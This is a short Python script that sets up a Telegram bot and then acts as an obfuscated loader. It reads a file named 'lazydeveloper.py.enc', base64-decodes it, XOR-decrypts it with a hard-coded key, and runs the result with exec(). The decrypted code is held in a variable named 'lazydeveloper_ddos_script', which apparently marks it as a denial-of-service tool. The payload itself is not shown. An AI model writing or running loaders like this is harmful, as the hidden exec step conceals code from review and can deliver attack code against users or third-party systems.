import base64
import telebot
import json

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

# Initialize the bot with your token
BOT_TOKEN = config['bot_token']
bot = telebot.TeleBot(BOT_TOKEN)

# First, delete any existing webhook
# bot.remove_webhook()

# Now start polling
# bot.polling() 

def lazydeveloper_dos(data: bytes, key: str) -> bytes:
    decrypted_bytes = bytearray()
    key_bytes = key.encode()

    for i in range(len(data)):
        decrypted_bytes.append(data[i] ^ key_bytes[i % len(key_bytes)])

    return decrypted_bytes

with open('lazydeveloper.py.enc', 'rb') as file:
    encbs64 = file.read()

lzdvscr = base64.b64decode(encbs64)


key = 'YT@LazyDeveloperr'
lazydeveloper_ddos_script = lazydeveloper_dos(lzdvscr, key)

exec(lazydeveloper_ddos_script.decode('latin1'))